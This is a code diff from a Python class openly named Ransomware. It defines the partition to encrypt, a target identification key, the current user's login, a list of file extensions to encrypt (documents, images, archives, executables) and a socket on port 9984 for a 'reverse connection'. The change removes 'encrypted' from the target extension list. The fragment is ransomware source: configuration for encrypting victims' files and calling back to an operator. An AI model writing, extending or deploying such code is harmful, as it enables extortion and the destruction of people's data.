@@ -30,7 +30,7 @@ class Ransomware : #  Ransomware class
         self.partition_letter = None  # Letter of partition to encrypt
         self.id_key = None # Key to id the target
         self.user_login = os.getlogin() # Get the name of the user
-        self.files_target = ['txt','jpg','jpeg','png','docx','doc','gif','html','ico','mp3','mp4','odt','odp','ods','odg','pdf','ppt','pps','pptx','py','zip','tar','md','xls','xlsx','wav','xml','log','exe','encrypted']
+        self.files_target = ['txt','jpg','jpeg','png','docx','doc','gif','html','ico','mp3','mp4','odt','odp','ods','odg','pdf','ppt','pps','pptx','py','zip','tar','md','xls','xlsx','wav','xml','log','exe']
 
         self.sock = socket.socket() # Object Socket
         self.port = 9984 # Port to reverse connection
